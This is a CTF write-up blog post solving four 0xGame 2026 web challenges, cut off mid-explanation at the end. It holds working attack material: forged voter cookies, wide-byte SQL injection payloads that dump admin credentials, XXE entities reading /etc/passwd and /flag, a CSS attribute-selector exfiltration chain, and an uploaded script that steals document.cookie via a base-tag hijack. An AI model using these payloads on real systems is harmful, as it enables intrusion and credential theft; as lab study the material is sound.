---
title: 0xgame2026week2-WP
date: '2026-10-22 13:07:21'
tags: []
categories:
  - CTF-Writeups
  - 0xGame2026-Web
slug: 0xgame2026week2-WP
permalink: /0xgame2026week2-wp
draft: false
---

## 1、关注塔菲谢谢喵~
这是一个投票系统，要求给永雏塔菲投票投成第一名，但是每个账号只能投一票，抓包后
```
POST /api/vote HTTP/1.1
Host: 8087-cc8147b2-4c76-4a40-9d92-433ad064bfe4.challenge.ctfplus.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://8087-cc8147b2-4c76-4a40-9d92-433ad064bfe4.challenge.ctfplus.cn/
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Origin: http://8087-cc8147b2-4c76-4a40-9d92-433ad064bfe4.challenge.ctfplus.cn
Connection: keep-alive
Cookie: _ga_BFDVYZJ3DE=GS2.1.s1792293963$o24$g1$t1792294756$j6$l0$h0; _ga=GA1.1.242289672.1779001013; _clck=1q7gq3l%5E2%5Egae%5E0%5E2328; voter=guest_eff11431eb280d54; sid=btONaV7R_9MP1iwv5Mz27WYw
Priority: u=0

vid=7
```
并没有哪个参数是可以修改投票次数的，所以我们可以考虑并发投票，但是并发200次后却只投成功了1票，所以用同一个账号并发200次不现实。
这时候我们是不是可以注册200个账号来投200票呢？首先不怎么现实，其次注册两个账号投2次票后永雏塔菲的票数依旧显示1票。
这时候我们可以观察一下投票的报文，报文的Cookie值里面有`voter`,`sid`两个值，经过实测sid带不带都会显示投票成功，但是没有voter这参数就显示投票失败，所以服务端只认 voter 的本地值，不校验它是不是自己签发的。
我们可以利用这个漏洞来伪造300个voter来欺骗服务端
```
guest_f8f89ea298d5089c
guest_23c55be1a7944043
guest_d05d92a9b113d79e
guest_c2b7377d99c5011a
guest_e9d08d55628b831c
guest_998fc283105cf7cb
......  # 随机生成300个
```
![](/images/20261022130722.png)

攻击完成后我们可以在响应里面看到
```
{"ok": true, "data": {"votes": 295, "name": "admin", "flag": "MHhHYW1le3YwdGVfNF90YWYzaV9UaGFuazVfbWlAb30="}}
```
最后我们把flag进行base64解码就得到了flag
```
0xGame{v0te_4_taf3i_Thank5_mi@o}
```

## 2、奶蛙的服务器

![](/images/20261022130722_1.png)

这需要我们先修复奶娃的博客服务器才能去看奶娃的博客

### 2.1 发现过程
**使用ssh登录**

可以在Windows的Powershell里面登录，但是个人推荐在kali里面
```
ssh repair@nc1.ctfplus.cn -p 43646
```
输入密码就能登录了

![](/images/20261022130722_2.png)

**查看系统中与 Nginx 和 PHP-FPM 相关的进程**

执行命令
```
ps aux | grep -E "nginx|php-fpm" | grep -v grep
```
根据返回的结果来看，Nginx 主进程和大量 worker 进程都在正常运行，既然 Nginx 活着，网站却返回 502，说明 Nginx 把请求转发给后端（比如 PHP-FPM、Node.js、Python 等）时失败了。但是返回结果里面完全没有看到 `php-fpm` 或其他后端进程，这很可能就是问题所在：后端服务挂了或者根本没启动。
**去 nginx 配置里找日志指令**（因为banner告诉我们check the logs first）

```
ls -la /var/log/nginx/
```
结果返回
```
total 12
drwxr-xr-x 2 root     adm  4096 Oct  4 05:55 .
drwxr-xr-x 1 root     root 4096 Oct 18 06:03 ..
-rw-r----- 1 www-data adm     0 Oct  4 05:55 access.log
-rw-r----- 1 www-data adm     0 Oct  4 05:55 error.log
```
这里的error.log显示的是0字节，说明日志被写在了别处，我们可以从配置里查看日志的真实路径，执行命令
```
grep -rn "error_log\|access_log" /etc/nginx/
```
结果返回
```
/etc/nginx/nginx.conf:13:    access_log /srv/naiwa/logs/access.log;
/etc/nginx/nginx.conf:14:    error_log /srv/naiwa/logs/error.log warn;
```
所以真实的日志在`/srv/naiwa/logs/error.log`，查看真实的日志
```
tail -n 30 /srv/naiwa/logs/error.log
```
结果返回
```
2026/10/18 06:04:30 [crit] 21#21: *2 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 192.168.147.223, server: _, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "80-fa7e7295-63b1-4bcf-9924-068b25e1d404.challenge.ctfplus.cn"
2026/10/18 06:04:30 [crit] 23#23: *5 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 192.168.147.247, server: _, request: "GET /favicon.ico HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "80-fa7e7295-63b1-4bcf-9924-068b25e1d404.challenge.ctfplus.cn", referrer: "http://80-fa7e7295-63b1-4bcf-9924-068b25e1d404.challenge.ctfplus.cn/"
```
找到根因：
- nginx 要把 PHP 请求交给 `unix:/run/php/php-fpm.sock`（一个 Unix 域套接字文件）
- 但 `No such file or directory` —— **这个 socket 文件不存在**
- socket 由 **php-fpm** 在启动时创建 → **php-fpm 没启动**

**验证socket确实不存在**

执行命令
```
ls -la /run/php/
```
结果返回
```
total 12
drwxr-xr-x 1 www-data www-data 4096 Oct  4 07:32 .
drwxr-xr-x 1 root     root     4096 Oct 18 06:03 ..
```
`. 和..`说明是空目录

**找题目路径**

执行命令
```
ls -la /srv/naiwa/
```
结果返回
```
total 32
drwxr-xr-x 1 root     root     4096 Oct 18 06:01 .
drwxr-xr-x 1 root     root     4096 Oct  4 07:32 ..
drwxr-xr-x 1 repair   repair   4096 Oct  4 16:35 config
-rw-r----- 1 root     www-data   44 Oct 18 06:01 flag
drwxr-xr-x 1 www-data www-data 4096 Oct 18 06:01 logs
```

**查看服务配置文件**

执行命令
```
cat /srv/naiwa/config/service.ini
```
结果返回
```
[service]
mode = recovery     # 恢复模式（不是生产）
maintenance = on    # 维护开关打开（拒绝服务）
listen = 127.0.0.1:8088    # 只监听本机 8088（外部访问不到）
secret_backend = disabled  # 密码后端被禁用

[notes]
owner = naiwa
last_incident = archive worker lost its public route after a sleepy restart
```
很明显，service全出现故障

**确定自己的权限**

执行命令
```
sudo -l
```
结果返回
```
Matching Defaults entries for repair on dep-fa7e7295-63b1-4bcf-9924-068b25e1d404-5d7c6db847-vbsqr:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User repair may run the following commands on
        dep-fa7e7295-63b1-4bcf-9924-068b25e1d404-5d7c6db847-vbsqr:
    (root) NOPASSWD: /usr/local/sbin/service, /usr/local/sbin/php-fpm-service
```
权限给的很低，只能启/停服务，不能干别的。

**读启动脚本**

执行命令
```
cat /usr/local/sbin/php-fpm-service
```
结果返回
```
config_ready() {
    [ "$(read_value mode)" = "production" ] &&
    [ "$(read_value maintenance)" = "off" ] &&
    [ "$(read_value listen)" = "0.0.0.0:80" ] &&
    [ "$(read_value secret_backend)" = "enabled" ]
}

start_fpm() {
    mkdir -p /run/php "$STATE_DIR"
    chown www-data:www-data /run/php
    if ! config_ready; then
        printf "broken\n" > "$STATE_FILE"
        {
            echo "php-fpm refused to start: /srv/naiwa/config/service.ini is not production-ready"
            echo "current:"
            echo "  mode=$(read_value mode)"
            echo "  maintenance=$(read_value maintenance)"
            echo "  listen=$(read_value listen)"
            echo "  secret_backend=$(read_value secret_backend)"
        } | tee -a "$LOG_FILE" >&2
        exit 1
    fi
    stop_fpm >/dev/null 2>&1 || true
    php-fpm -D
    sleep 1
    write_state
    echo "php-fpm started"
}
```
**结论**：service.ini 的四个值必须**同时**满足上面那组条件，否则脚本直接拒绝启动 —— 这就是"服务起不来"的机制。

**用脚本自己的诊断再确认**

执行命令
```
sudo /usr/local/sbin/php-fpm-service status
```
结果返回
```
php-fpm is stopped
config: /srv/naiwa/config/service.ini
mode=recovery
maintenance=on
listen=127.0.0.1:8088
secret_backend=disabled
runtime=broken
```
错误根源找到

### 2.2 修复过程
**先备份**

执行命令
```
cd /srv/naiwa/config
cp service.ini service.ini.bak.$(date +%s)
```

**修改service的四个值**

```
nano service.ini
# 改完 Ctrl+O 保存、Ctrl+X 退出
```
改为
```
mode = production
maintenance = off
listen = 0.0.0.0:80
secret_backend = enabled
```

**启动php-fpm**

```
sudo /usr/local/sbin/php-fpm-service start
```
输出
```
[18-Oct-2026 07:40:38] NOTICE: fpm is running, pid 203
[18-Oct-2026 07:40:38] NOTICE: ready to handle connections
php-fpm started
```

到此网站成功修复成功

### 2.3 获取flag

先访问奶娃的博客
![](/images/20261022130722_3.png)
成功访问

![](/images/20261022130722_4.png)

我们可以执行命令看看登录后台的账密
```
cat /var/www/html/login.php
```
输出
```
<?php
declare(strict_types=1);
require __DIR__ . '/lib.php';

session_start();
$error = '';
$adminPassword = 'chocolate9';

if (!service_ready()) {
    render_bad_gateway();
    exit;
}
```
这部分就可以看出密码是`chocolate9`，尝试登录
![](/images/20261022130722_5.png)

就成功获取flag了。

### 2.4 一键poc
```python
import re
import sys
try:
    import paramiko
except ImportError:
    print("[!] 缺少 paramiko，先执行：")
    print("    pip install paramiko -i https://mirrors.aliyun.com/pypi/simple/")
    sys.exit(1)
# ======================= 配置（改这三行） =======================
HOST = "nc1.ctfplus.cn"
PORT = 15709
USER = "repair"
PASS = "repair123"
# =============================================================
# 远端执行的脚本（和 bash 版逻辑完全一致，已实测）
REMOTE = r'''
set -u
echo "===== [1] 初始状态 ====="
sudo -n /usr/local/sbin/php-fpm-service status 2>&1
echo ""
echo "===== [2] 备份 + 修改 service.ini ====="
cd /srv/naiwa/config || exit 1
cp service.ini "service.ini.bak.$(date +%s)"
sed -i -e 's/^mode = .*/mode = production/' \
       -e 's/^maintenance = .*/maintenance = off/' \
       -e 's|^listen = .*|listen = 0.0.0.0:80|' \
       -e 's/^secret_backend = .*/secret_backend = enabled/' service.ini
cat service.ini
echo ""
echo "===== [3] 彻底停止旧实例（关键：等它死透再启动）====="
sudo -n /usr/local/sbin/php-fpm-service stop 2>&1
sleep 2
if pgrep -x php-fpm >/dev/null 2>&1; then
    echo "[!] 仍有残留进程，再等 2 秒"
    sleep 2
fi
echo "残留进程: $(pgrep -x php-fpm || echo 无)"
echo ""
echo "===== [4] 启动 php-fpm ====="
# 重定向输出：避免 daemon 继承 SSH 通道 fd 导致会话结束后进程被杀
sudo -n /usr/local/sbin/php-fpm-service start </dev/null >/tmp/fpm-start.log 2>&1
echo "start 退出码: $?"
cat /tmp/fpm-start.log
echo ""
echo "===== [5] 验证 ====="
sudo -n /usr/local/sbin/php-fpm-service status 2>&1 | tail -3
ls -la /run/php/ | grep php-fpm.sock
curl -s -o /dev/null -w "首页 HTTP: %{http_code}\n" http://127.0.0.1/


echo ""

echo "===== [6] 取 flag ====="

PW=$(grep -oP "adminPassword = '\K[^']+" /var/www/html/login.php)

echo "后台密码（源码硬编码）: $PW"

curl -s -c /tmp/c.txt -d "username=admin&password=$PW" \

     -o /dev/null -w "login HTTP: %{http_code}\n" http://127.0.0.1/login.php

FLAG=$(curl -s -b /tmp/c.txt http://127.0.0.1/admin.php | grep -o '0xGame{[^}]*}')

rm -f /tmp/c.txt

  

if [ -n "$FLAG" ]; then

    echo "POC_FLAG:$FLAG"

else

    echo "POC_NOFLAG"

fi

'''

def main() -> int:
    print("=" * 62)
    print(f" 目标: {USER}@{HOST}:{PORT}")
    print("=" * 62)

    client = paramiko.SSHClient()
   client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(HOST, port=PORT, username=USER, password=PASS,
                       timeout=20, banner_timeout=20, auth_timeout=20)
    except Exception as e:
        print(f"[!] SSH 连接失败: {e}")
        print("    检查：实例是否过期 / 端口是否变了（每次重开都会变）")
        return 1
    try:
        channel = client.get_transport().open_session()
        channel.settimeout(120)
        channel.exec_command("bash -s")
        channel.sendall(REMOTE.encode())
        channel.shutdown_write()          # 告诉远端 stdin 结束，bash 开始执行
        # 分段读取（避免 daemon 残留 fd 导致永久阻塞）
        out = b""
        while True:
            try:
                chunk = channel.recv(4096)
                if not chunk:
                    break
                out += chunk
            except Exception:
                break

        text = out.decode("utf-8", "replace")
        print(text)
        m = re.search(r"POC_FLAG:(0xGame\{[^}]+\})", text)
        if m:
            print("=" * 62)
            print(f" [+] FLAG: {m.group(1)}")
            print("=" * 62)
            return 0


        if "POC_NOFLAG" in text:
            print("[!] 没取到 flag —— 看上面哪一步不对（首页是否 200、login 是否 302）")
        else:
            print("[!] 输出不完整，可能连接被中断；重跑一次试试")
        return 1
    finally:
        client.close()

if __name__ == "__main__":

    sys.exit(main())
```

## 3、留言板
![](/images/20261022130722_6.png)
进入靶场后，看样子是需要我们登录到管理员账号什么什么的，尝试弱口令爆破，最终得到了两个成功登录的账号：`guest/guest123`,`tom/tom12345`。不过都是普通账号，不过也是得到了一些信息的，他说发布页只有管理员可以访问。
所以我们可以尝试其他的方式，比如sql注入，未授权访问等等。
看看SQL注入是否成功
```
action=login&username=admin'&password=123
action=login&username=admin"&password=123
action=login&username=admin)&password=123
action=login&username=admin')&password=123
action=login&username=admin")&password=123
......
```
好像都每什么反应，于是尝试扫描目录，看看能不能找到一些未授权访问的接口。结果发现
```
/health
/debug/pprof/
/debug/pprof/heap
/debug/pprof/goroutine?debug=1
/debug/pprof/trace
/metrics
```
这些接口其实没有什么用，于是继续尝试能不能SQL注入。其实这是一个宽字节注入，这个注入有时候很难让人注意到，所以以后我们可以写一个可以用来测试SQL注入闭合的字典，比如
```
'
"
')
")
'))--
'))#
'--
'#
"--
"#
')--
')#
")--
")#
1 and 1=1
1 and 1=2
1' and '1'='1
1' and '1'='2
1') and ('1'='1
1') and ('1'='2
1" and "1"="1
1" and "1"="2
1") and ("1"="1
1") and ("1"="2
1%df'
1%df' and 1=1%23
1%df' and 1=2%23
1%bf'
1%81'
```
当我们
```
action=login&username=admin%bf'&password=123
```
出现了报错信息
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''admin縗'' LIMIT 1' at line 1
```
接下来我们需要查询列数
```
action=login&username=%bf%27%20ORDER%20BY%206%20--%20-&password=123
```
结果返回
```
Unknown column '6' in 'ORDER BY'
```
既然是用管理员账号登录，我们可以直接去查询admin账户的密码（有时候也可能管理员的账号是root、superadmin等等）
```
action=login&username=%bf%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28SELECT%20CONCAT%28username%2C0x3a%2Cpassword%29%20FROM%20users%20WHERE%20role%3D0x61646d696e%20LIMIT%201%29%29%29%20--%20-&password=123
```
结果返回
```
<pre>XPATH syntax error: '~admin:inexww233'</pre>
```
这就成功拿到了管理员的账号和密码了，尝试登录
```
action=login&username=admin&password=inexww233
```

![](/images/20261022130722_7.png)

看样子是一个XML的模板注入，做一个探测的payload
```
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<message>
  <title>&xxe;</title>
  <content>x</content>
</message>
```
回显
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin mysql:x:100:101:MariaDB Server:/nonexistent:/bin/false
```
说明确实是XML外部实体注入，尝试读取flag
```
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<message>
  <title>&xxe;</title>
  <content>x</content>
</message>
```
就能得到flag了。

## 4、留言板 revenge

和上面一样也是留言板，不过这一题看起来 XSS 的可能性最大，因为页面顶部写着：

> 头部片段经过清洗后，只会保留极少量安全标签。
> 审核预览公开页时，会渲染你保存的头部片段。

![](/images/20261022130722_8.png)

我们先尝试一下创建一个留言板看看。

![](/images/20261022130722_9.png)

点击「请求机器人预览公开页」时，第一次看到的是：

```
机器人错误：page.goto: Timeout 12000ms exceeded. Call log: - navigating to "http://127.0.0.1/p/569ba386/", waiting until "domcontentloaded"
```

先别被“错误”两个字带偏，这个报错其实透露了机器人是怎么访问页面的：它用 Playwright 打开 `http://127.0.0.1/p/<slug>/`，等待 `domcontentloaded`。也就是说，**机器人是在容器内部、以同源方式访问公开页的**。后面我们在回执里拿到的 `base=http%3A%2F%2F127.0.0.1%2Fuploads%2F...` 也正好验证了这一点。
### 4.1 页面源码的妙用

访问公开页 `/p/<slug>/`，查看网页源码，`<head>` 里有两段注释（本环境实测原样返回）：

```html
<!-- 审核预览时会额外执行一个只会出现在审核人员浏览器视角中的特定路径脚本。 -->
<!-- 那段脚本的文件名会出现在一个隐藏表单项里，可以留意 input[name="review-script"] 这样的元素。 -->
```

管理页源码里还有一行：

```html
<!-- 回执模板：/collect/f6d53f6b?kind=<label>&value=<data> -->
```

公开页的 CSP 是：

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'nonce-EJ0He8o7jg3QKDOB'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; object-src 'none'; frame-ancestors 'none';">
```

把这几条放在一起，思路就出来了：

- 审核视角里有一个隐藏输入框，值是审核脚本的文件名，**可以偷**；
- `/collect/<slug>?kind=...` 是现成的回执通道，偷出来**有地方写**；
- `style-src` 允许内联样式，`img-src` 允许同源图片，所以 **CSS 可以按条件发起同源请求**；
- `script-src` 只认 nonce，直接注入 `<script>` 或 `onerror` 走不通，必须绕。

这就是为什么后面的 payload 全都围绕 CSS 和 `<base>` 构造，而不是常规的 `<script>alert(1)</script>`。

### 4.2 洗白器实测

“只保留极少量安全标签”这句话很关键，我们先把各种标签都提交一遍，看看洗白器的边界（实测结果如下）：

| 输入的 `head_snippet`                      | 公开页里的结果 |
| --------------------------------------- | ------- |
| `<script>alert(1)</script>`             | 删除      |
| `<img src=x onerror=alert(1)>`          | 删除      |
| `<link rel="stylesheet" href="/x.css">` | 删除      |
| `<style>body{background:red}</style>`   | 原样保留    |
| `<base href="/uploads/f6d53f6b/">`      | 原样保留    |
| `<base href="//evil.example/">`         | 删除      |
| `<base href="https://evil.example/">`   | 删除      |
| `<base href="uploads/x/">`              | 删除      |

这张表是变量隔离后的复测：`base` 单独提交、`<style>` + `base` 组合、带 `target` 的 base 都试过，结论一致；额外属性会被清掉，只剩 href。结论很明确：洗白器只放行“以单个 `/` 开头的根相对路径”的 `<base href>`，同时把 `<style>` 原样输出、不做内容过滤（浏览器仍会按 CSS 解析执行，后面的背景图探针就是靠这一点）。它本意可能是允许页面引用站内资源，但没有意识到 `<base>` 会改变**整页所有相对 URL** 的解析基准。

这就是本题的入口，也是后面 `<base href="/uploads/<slug>/">` 能构造出来的原因：**不是我们硬塞了一个被禁止的标签，而是洗白器自己放行了这个标签，只限制了 href 必须以 `/` 开头。**

### 4.3 为什么不是 XSS

先看 CSP 里和脚本有关的两条：
- `script-src 'nonce-<每次随机的值>'`：只有带正确 nonce 的脚本元素能执行；内联 `<script>`、`onerror`、`onclick` 全部被拦；
- `style-src 'self' 'unsafe-inline'`：内联 `<style>` 是允许的。
即使洗白器漏掉了一个 `<script>`，CSP 也会把它拦下来；反过来，`<style>` 是我们唯一能稳定保留、并且能“执行”的东西。CSS 本身不是脚本，但它可以：
1. 用属性选择器读取 DOM 里的属性值；
2. 根据选择器是否命中，决定是否加载一张背景图；
3. 背景图请求受 `img-src 'self'` 约束，而 `/collect/<slug>` 正好是同源。
所以 CSS 就变成了一个“按条件发请求”的盲注通道：条件成立就发请求，不成立就不发，我们再从回执里看哪个请求出现了。
### 4.4 偷审核脚本名
机器人视角的页面里会多出一段审核运行时结构。隐藏框来自页面注释；脚本标签本身在公开页里看不到，是根据后面 diag 回执里的 `src` 和 `nonce` 重建出来的：
```html
<input type="hidden" name="review-script" value="review-9e9e63.js">
...
<script src="review-9e9e63.js" nonce="<bot 自己那份 CSP 的 nonce>"></script>
```

文件名是 `review-` 加 6 位小写十六进制，再加 `.js`。我们手上四块板子分别是 `review-43db8b.js`、`review-c13a76.js`、`review-445f51.js`、`review-9e9e63.js`，没有观察到能由 slug/token 直接推导的关系，所以实战中按“不可猜、必须逐板泄漏”处理。

于是我们把下面这段 CSS 填进「头部片段」：

```html
<style>
html{background-image:url("/collect/f6d53f6b? kind=r0_base&value=1")}
body:has(input[name="review-script"][value^="review-0"]){background-image:url("/collect/f6d53f6b?kind=r0_0&value=1")}
body:has(input[name="review-script"][value^="review-1"]){background-image:url("/collect/f6d53f6b?kind=r0_1&value=1")}
body:has(input[name="review-script"][value^="review-2"]){background-image:url("/collect/f6d53f6b?kind=r0_2&value=1")}
body:has(input[name="review-script"][value^="review-3"]){background-image:url("/collect/f6d53f6b?kind=r0_3&value=1")}
body:has(input[name="review-script"][value^="review-4"]){background-image:url("/collect/f6d53f6b?kind=r0_4&value=1")}
body:has(input[name="review-script"][value^="review-5"]){background-image:url("/collect/f6d53f6b?kind=r0_5&value=1")}
body:has(input[name="review-script"][value^="review-6"]){background-image:url("/collect/f6d53f6b?kind=r0_6&value=1")}
body:has(input[name="review-script"][value^="review-7"]){background-image:url("/collect/f6d53f6b?kind=r0_7&value=1")}
body:has(input[name="review-script"][value^="review-8"]){background-image:url("/collect/f6d53f6b?kind=r0_8&value=1")}
body:has(input[name="review-script"][value^="review-9"]){background-image:url("/collect/f6d53f6b?kind=r0_9&value=1")}
body:has(input[name="review-script"][value^="review-a"]){background-image:url("/collect/f6d53f6b?kind=r0_a&value=1")}
body:has(input[name="review-script"][value^="review-b"]){background-image:url("/collect/f6d53f6b?kind=r0_b&value=1")}
body:has(input[name="review-script"][value^="review-c"]){background-image:url("/collect/f6d53f6b?kind=r0_c&value=1")}
body:has(input[name="review-script"][value^="review-d"]){background-image:url("/collect/f6d53f6b?kind=r0_d&value=1")}
body:has(input[name="review-script"][value^="review-e"]){background-image:url("/collect/f6d53f6b?kind=r0_e&value=1")}
body:has(input[name="review-script"][value^="review-f"]){background-image:url("/collect/f6d53f6b?kind=r0_f&value=1")}
</style>
```
其中的f6d53f6b为`<slug>`
这段看起来很长，其实只有三种规则，我们一行一行拆开看。

#### 第一条：`html{...r0_base...}` 是“本轮活体标记”

```css
html{background-image:url("/collect/<slug>?kind=r0_base&value=1")}
```

这条规则没有选择器条件，页面一渲染就一定会请求 `/collect`，回执里就会出现一条 `r0_base`。它只能证明**这一轮有客户端加载了页面**；要确认是审核机器人，还得看回执的 UA（本环境是 `HeadlessChrome/140.0.7339.16`）。我们自己点「打开已发布页面」也会触发这条，所以不要只凭 `r0_base` 判断机器人来过。

为什么要单独放在 `html` 上？因为下面 16 条候选都打在 `body` 上。如果把活体标记也放在 `body`，多条 `background-image` 会互相覆盖，CSS 层叠最后只会保留一条，我们可能既看不到标记，也看不到命中。分开到 `html` 和 `body` 两个元素，各管各的，互不干扰。

#### 后十六条：一个候选字符一条规则

以 `0` 为例：

```css
body:has(input[name="review-script"][value^="review-0"]) {
  background-image: url("/collect/<slug>?kind=r0_0&value=1")
}
```

这里每个部分都有明确的出处和目的：

- `input[name="review-script"]`：直接来自页面注释里提示的隐藏表单项。隐藏输入框虽然不可见，但它的属性照样参与 CSS 选择器匹配；
- `[value^="review-0"]`：`^=` 是“以……开头”的属性选择器。我们已知前缀是 `review-`，这一轮就是在猜下一位是不是 `0`；
- `body:has(...)`：隐藏框是 `body` 的后代，普通选择器没法把 `background-image` 反向作用到祖先 `body`；`:has()` 让 `body` 在“内部包含满足条件的 input”时命中。HeadlessChrome/140 支持 `:has()`，所以可以用；
- 为什么不直接写 `input[...] { background-image: ... }`？因为 `input type="hidden"` 根本不渲染，不会触发图片请求；必须把背景图挂到一个真实渲染的祖先元素上；
- `background-image:url(...)`：只有规则命中时，浏览器才会去加载这张图。这就是“条件成立才发请求”的核心；
- `kind=r0_0`：把“第 0 轮、候选字符 0”写进 URL。`/collect` 会把 `kind` 原样记进回执，我们不需要猜是哪个请求，回执里直接写着；
- `value=1`：随便填的占位值，真正要读的是 `kind`。

一轮为什么是 16 条？因为下一位是十六进制字符，只有 `0-9a-f` 这 16 种可能。CSS 没有循环、没有字符串比较函数，唯一的办法就是**把 16 种可能都写成选择器**，让浏览器自己匹配。前缀正确时，只有一条会命中；前缀错误时，一条都不会命中。于是每一轮就是一个 16 选 1 的盲注。

#### 为什么不能一次把 6 位全猜了

每一位的候选选择器都依赖前面已经确定的前缀。第 1 位不知道，就没法写第 2 位的 `value^="review-9x"`。所以只能一位一位来，6 位就是 6 轮。每轮的动作都是：

```
保存留言板（写入新 CSS）
  -> 请求机器人预览公开页（让 bot 带着新 CSS 访问）
  -> 等一下
  -> 查看访问回执（看 rN_base 和 rN_x 哪条出现）
```
### 4.5 上传同名恶意 JS

接下来要把一段 JS 放到 `/uploads/<slug>/review-9e9e63.js`。为什么文件名必须完全一致？因为最后 `<base>` 劫持的目标就是这个相对路径：

```html
<script src="review-9e9e63.js" nonce="..."></script>
```

（这个标签是根据回执里的 `src` 和 `nonce` 重建的，普通访问公开页时源码里没有它。）

base 改成 `/uploads/<slug>/` 之后，浏览器请求的就是 `/uploads/<slug>/review-9e9e63.js`。文件名少一个字符、大小写不同，都会 404，脚本就不会执行。

在管理页的「上传或覆盖静态资源」里填：

- 文件名：`review-9e9e63.js`
- 内容：

```javascript
(function(){
  try{
    var c = document.cookie;
    var s = (document.scripts && document.scripts[0]) || {};
    var d = 'base=' + encodeURIComponent(document.baseURI)
          + '|src=' + encodeURIComponent(s.src || '')
          + '|nonce=' + encodeURIComponent(s.nonce || '')
          + '|cookie=' + encodeURIComponent(c);
    new Image().src = '/collect/<slug>?kind=diag&value=' + encodeURIComponent(d);
  }catch(e){
    new Image().src = '/collect/<slug>?kind=err&value=' + encodeURIComponent(String(e));
  }
})();
```

这段 JS 每一部分的理由：

- `document.cookie`：flag 就在机器人会话的 `flag` Cookie 里，而且它不是 HttpOnly，JS 能直接读。`reviewhub_sid` 是 HttpOnly（`GET /` 的响应头实测：`Set-Cookie: reviewhub_sid=...; path=/; HttpOnly; SameSite=Lax`），读不到也不需要；
- `document.baseURI`、`s.src`、`s.nonce`：这三个不是必须的，但非常有用。它们能在回执里证明“base 确实被改了”“脚本确实是从 uploads 目录加载的”“nonce 确实还在”；
- `new Image().src = '/collect/...'`：用图片请求外带。`img-src 'self'` 允许同源图片；`Image` 不受 CORS 限制，也不需要处理响应；
- `encodeURIComponent`：cookie 里有 `{`、`}`、`=`、`;` 等字符，直接拼进 URL 会破坏参数结构，编码后再拼最稳；
- `try/catch` + `kind=err`：如果 JS 报错，回执里会出现 `err`，方便区分“没执行”和“执行了但报错”。

上传后可以验证一下文件确实以正确类型返回：

```http
GET /uploads/f6d53f6b/review-9e9e63.js HTTP/1.1
Host: 80-94e1d51f-80d8-4fbe-933a-fd2c7b4c2f19.challenge.ctfplus.cn
```

实测响应：

```http
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=UTF-8
```

### 4.6 注入 `<base>`

把「头部片段」改成：

```html
<style>body{}</style><base href="/uploads/f6d53f6b/">
```

点「保存留言板」。这里有几个容易忽略的细节：

1. **为什么 href 是 `/uploads/<slug>/`，而不是 `uploads/<slug>/`？** 洗白器只放行以单个 `/` 开头的根相对路径；`uploads/...` 会被删掉，`//evil.example/` 也会被删掉。实测只有 `"/uploads/f6d53f6b/"` 这种形式能留下。
2. **为什么末尾必须有斜杠？** `<base href>` 是一个 URL，相对 URL 会按它解析。`href="/uploads/f6d53f6b/"`（末尾有 `/`）表示这是一个目录，`review-9e9e63.js` 解析成 `/uploads/f6d53f6b/review-9e9e63.js`；如果写成 `href="/uploads/f6d53f6b"`，会被当成文件，`review-9e9e63.js` 会解析成 `/uploads/review-9e9e63.js`，路径就错了。
3. **为什么 `<base>` 必须出现在脚本标签之前？** `<base>` 只影响它之后解析的相对 URL。我们的片段被塞进 `<head>`，而审核脚本标签是服务器在后面渲染的，所以顺序正好：先读 base，再解析脚本的 `src`。
4. **前面的 `<style>body{}</style>` 是必须的吗？** 不是。我们复测过单独提交 `<base href="/uploads/<slug>/">`，base 照样保留；空的 `<style>` 只是习惯性占位，真正起作用的是后面的 `<base>`。

验证 base 确实写进了公开页：

```http
GET /p/f6d53f6b/ HTTP/1.1
```

响应 `<head>` 里可以看到：

```html
<style>body{}</style><base href="/uploads/f6d53f6b/">
```

此时机器人页面里的脚本标签仍然是服务器渲染的：

```html
<script src="review-9e9e63.js" nonce="<CSP nonce>"></script>
```

但浏览器解析出的真实地址已经变成：

```
http://127.0.0.1/uploads/f6d53f6b/review-9e9e63.js
```

也就是我们上传的那个文件。**这就是为什么前面要花 6 轮泄漏文件名**：如果不知道这个名字，就不知道该上传什么文件，base 劫持过去也只会 404。

### 4.7 为什么 CSP 没拦住

这是整条链最容易被问的地方：

